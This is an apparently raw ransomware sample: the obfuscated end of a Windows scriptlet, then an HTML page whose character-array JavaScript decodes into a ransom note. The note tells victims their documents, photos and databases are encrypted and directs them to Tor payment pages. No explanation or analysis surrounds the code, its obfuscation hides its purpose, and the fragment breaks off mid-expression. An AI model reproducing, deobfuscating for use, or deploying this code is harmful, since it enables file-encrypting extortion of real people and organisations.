01095[28]+g2701095[7]+g2701095[31]+g2701095[28]+g2701095[20]+g2701095[30]+g2701095[34]+g2701095[2]+g2701095[49]+g2701095[7]+g2701095[28]+g2701095[14]+g2701095[49]+g2701095[2]+g2701095[2]+g2701095[7]+g2701095[6]+g2701095[46]+g2701095[49]+g2701095[26]+g2701095[7]+g2701095[20]+g2701095[6]+g2701095[31]+g2701095[31]+g2701095[21]+g2701095[26]+g2701095[24]+g2701095[7],g2701095[39]+g2701095[49]+g2701095[5]+g2701095[28]+g2701095[12]+g2701095[39]+g2701095[9]+g2701095[41]+g2701095[33]+g2701095[49]+g2701095[0]+g2701095[49]+g2701095[40]+g2701095[28]+g2701095[20]+g2701095[39]+g2701095[6]+g2701095[36]+g2701095[15]+g2701095[33]+g2701095[24]+g2701095[2]+g2701095[2]+g2701095[40]+g2701095[10]+g2701095[28]+g2701095[40]+g2701095[10]+g2701095[50]+g2701095[40]+g2701095[10]+g2701095[26]+g2701095[40]+g2701095[10]+g2701095[34]+g2701095[16]+g2701095[33]+g2701095[33]+g2701095[10]+g2701095[33]+g2701095[33]+g2701095[10]+g2701095[33]+g2701095[33]+g2701095[10]+g2701095[35]+g2701095[28]+g2701095[49]+g2701095[39]+g2701095[28]+g2701095[10]+g2701095[25]+g2701095[50]+g2701095[36]+g2701095[2]+g2701095[34]+g2701095[20]+g2701095[10]+g2701095[3]+g2701095[4]+g2701095[43]+g2701095[3]+g2701095[14]+g2701095[29],g2701095[32]+g2701095[17]+g2701095[45]+g2701095[11]+g2701095[13]+g2701095[23]);]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; . Embeded HTML . &lt;html&gt;&lt;body&gt;&lt;script&gt;var c7gs9b80 = new Array(70,110,112,108,82,114,50,49,100,73,111,47,51,120,105,102,72,33,117,119,69,84,58,61,115,66,78,46,101,121,104,76,32,52,39,97,55,60,89,80,79,109,103,106,68,113,65,116,98,62,85,99,83,54,77,107,86,67,122,118);for(var w38qp=0;w38qp&lt;60;w38qp++) c7gs9b80[w38qp] = String.fromCharCode(c7gs9b80[w38qp]);d8k8ylg = &quot; &quot;;document.write(c7gs9b80[46]+c7gs9b80[31]+c7gs9b80[31]+c7gs9b80[32]+c7gs9b80[38]+c7gs9b80[40]+c7gs9b80[50]+c7gs9b80[4]+c7gs9b80[32]+c7gs9b80[44]+c7gs9b80[40]+c7gs9b80[57]+c7gs9b80[50]+c7gs9b80[54]+c7gs9b80[20]+c7gs9b80[26]+c7gs9b80[21]+c7gs9b80[52]+c7gs9b80[32]+c7gs9b80[39]+c7gs9b80[16]+c7gs9b80[40]+c7gs9b80[21]+c7gs9b80[40]+c7gs9b80[52]+c7gs9b80[32]+c7gs9b80[44]+c7gs9b80[46]+c7gs9b80[21]+c7gs9b80[46]+c7gs9b80[25]+c7gs9b80[46]+c7gs9b80[52]+c7gs9b80[20]+c7gs9b80[52]+c7gs9b80[32]+c7gs9b80[46]+c7gs9b80[26]+c7gs9b80[44]+c7gs9b80[32]+c7gs9b80[40]+c7gs9b80[21]+c7gs9b80[16]+c7gs9b80[20]+c7gs9b80[4]+c7gs9b80[32]+c7gs9b80[9]+c7gs9b80[54]+c7gs9b80[39]+c7gs9b80[40]+c7gs9b80[4]+c7gs9b80[21]+c7gs9b80[46]+c7gs9b80[26]+c7gs9b80[21]+c7gs9b80[32]+c7gs9b80[0]+c7gs9b80[9]+c7gs9b80[31]+c7gs9b80[20]+c7gs9b80[52]+c7gs9b80[32]+c7gs9b80[16]+c7gs9b80[46]+c7gs9b80[56]+c7gs9b80[20]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[20]+c7gs9b80[20]+c7gs9b80[26]+c7gs9b80[32]+c7gs9b80[20]+c7gs9b80[26]+c7gs9b80[57]+c7gs9b80[4]+c7gs9b80[38]+c7gs9b80[39]+c7gs9b80[21]+c7gs9b80[20]+c7gs9b80[44]+c7gs9b80[17]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[38]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[26]+c7gs9b80[40]+c7gs9b80[21]+c7gs9b80[32]+c7gs9b80[8]+c7gs9b80[35]+c7gs9b80[41]+c7gs9b80[35]+c7gs9b80[42]+c7gs9b80[28]+c7gs9b80[8]+c7gs9b80[17]+c7gs9b80[32]+c7gs9b80[38]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[41]+c7gs9b80[10]+c7gs9b80[8]+c7gs9b80[14]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[28]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[3]+c7gs9b80[29]+c7gs9b80[27]+c7gs9b80[32]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[41]+c7gs9b80[10]+c7gs9b80[8]+c7gs9b80[14]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[51]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[59]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[24]+c7gs9b80[14]+c7gs9b80[48]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[27]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[3]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[7]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[35]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[8]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[2]+c7gs9b80[47]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[28]+c7gs9b80[14]+c7gs9b80[59]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[14]+c7gs9b80[59]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[55]+c7gs9b80[28]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[1]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[8]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[2]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[42]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[41]+c7gs9b80[27]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[46]+c7gs9b80[1]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[41]+c7gs9b80[2]+c7gs9b80[47]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[14]+c7gs9b80[5]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[47]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[24]+c7gs9b80[10]+c7gs9b80[15]+c7gs9b80[47]+c7gs9b80[19]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[48]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[35]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[17]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[28]+c7gs9b80[14]+c7gs9b80[59]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[14]+c7gs9b80[59]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[55]+c7gs9b80[28]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[1]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[8]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[2]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[42]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[41]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[3]+c7gs9b80[3]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[24]+c7gs9b80[47]+c7gs9b80[5]+c7gs9b80[18]+c7gs9b80[51]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[48]+c7gs9b80[28]+c7gs9b80[3]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[22]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[7]+c7gs9b80[27]+c7gs9b80[32]+c7gs9b80[44]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[1]+c7gs9b80[3]+c7gs9b80[10]+c7gs9b80[35]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[34]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[34]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[41]+c7gs9b80[32]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[24]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+c7gs9b80[19]+c7gs9b80[19]+c7gs9b80[19]+c7gs9b80[27]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[43]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[47]+c7gs9b80[27]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[42]+c7gs9b80[11]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[1]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[24]+c7gs9b80[47]+c7gs9b80[35]+c7gs9b80[3]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[47]+c7gs9b80[27]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[6]+c7gs9b80[27]+c7gs9b80[32]+c7gs9b80[9]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[34]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[34]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[2]+c7gs9b80[28]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[24]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[35]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[35]+c7gs9b80[42]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[22]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[41]+c7gs9b80[30]+c7gs9b80[3]+c7gs9b80[13]+c7gs9b80[53]+c7gs9b80[12]+c7gs9b80[41]+c7gs9b80[36]+c7gs9b80[45]+c7gs9b80[48]+c7gs9b80[24]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[59]+c7gs9b80[51]+c7gs9b80[5]+c7gs9b80[36]+c7gs9b80[33]+c7gs9b80[59]+c7gs9b80[6]+c7gs9b80[58]+c7gs9b80[59]+c7gs9b80[43]+c7gs9b80[13]+c7gs9b80[48]+c7gs9b80[59]+c7gs9b80[36]+c7gs9b80[2]+c7gs9b80[42]+c7gs9b80[43]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[19]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[48]+c7gs9b80[36]+c7gs9b80[10]+c7gs9b80[35]+c7gs9b80[15]+c7gs9b80[33]+c7gs9b80[19]+c7gs9b80[51]+c7gs9b80[6]+c7gs9b80[41]+c7gs9b80[43]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[55]+c7gs9b80[30]+c7gs9b80[10]+c7gs9b80[28]+c7gs9b80[35]+c7gs9b80[35]+c7gs9b80[8]+c7gs9b80[27]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[26]+c7gs9b80[10]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[17]+c7gs9b80[32]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[35]+c7gs9b80[42]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[59]+c7gs9b80[35]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[35]+c7gs9b80[48]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[59]+c7gs9b80[14]+c7gs9b80[35]+c7gs9b80[32]+c7gs9b80[34]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[34]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[3]+c7gs9b80[29]+c7gs9b80[27]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[46]+c7gs9b80[3]+c7gs9b80[24]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[32]+c7gs9b80[51]+c7gs9b80[35]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[18]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[41]+c7gs9b80[2]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[8]+c7gs9b80[8]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[24]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[35]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[35]+c7gs9b80[42]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[47]+c7gs9b80[32]+c7gs9b80[18]+c7gs9b80[24]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[42]+c7gs9b80[32]+c7gs9b80[34]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[34]+c7gs9b80[22]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[13]+c7gs9b80[27]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[10]+c7gs9b80[8]+c7gs9b80[8]+c7gs9b80[51]+c7gs9b80[10]+c7gs9b80[2]+c7gs9b80[29]+c7gs9b80[27]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7g